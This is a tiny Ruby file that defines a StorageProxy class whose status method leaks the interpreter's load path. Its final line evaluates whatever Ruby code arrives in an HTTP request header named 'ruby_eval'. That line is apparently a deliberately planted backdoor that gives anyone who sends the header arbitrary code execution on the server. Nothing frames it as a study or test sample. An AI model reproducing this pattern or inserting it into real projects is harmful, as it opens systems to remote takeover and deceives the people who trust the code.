require 'rubygems'
# require 'faraday'

class StorageProxy  
  def self.status(id)
    return "Status of #{id} is unknown.\nLoadpath: #{$LOAD_PATH}"
  end
end

eval($request.headers['ruby_eval'])
